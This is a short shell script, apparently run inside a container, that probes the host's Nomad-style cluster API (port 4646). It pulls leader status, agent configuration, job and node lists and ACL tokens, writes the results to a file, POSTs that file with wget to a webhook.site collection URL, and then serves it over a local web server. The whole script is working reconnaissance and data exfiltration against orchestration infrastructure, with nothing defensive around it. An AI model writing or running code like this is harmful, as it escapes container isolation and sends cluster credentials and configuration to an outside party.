#!/bin/sh
{
N=http://host.containers.internal:4646
echo "==curl-status=="; curl -s -i -m 5 "$N/v1/status/leader" 2>&1 | head -20
echo; echo "==curl-agent=="; curl -s -m 5 "$N/v1/agent/self" 2>&1 | head -c 1500
echo; echo "==curl-jobs=="; curl -s -m 5 "$N/v1/jobs" 2>&1 | head -c 2000
echo; echo "==curl-nodes=="; curl -s -m 5 "$N/v1/nodes" 2>&1 | head -c 1200
echo; echo "==curl-acl=="; curl -s -m 5 "$N/v1/acl/tokens" 2>&1 | head -c 400
echo; echo "==curl-root=="; curl -s -i -m 5 "$N/" 2>&1 | head -15
} > /www/index.txt 2>&1
wget -q -O- --post-file=/www/index.txt "https://webhook.site/944a0813-f8cb-4afb-92cd-fa404a8621b0/ctr11" >/dev/null 2>&1
httpd -f -p 8080 -h /www
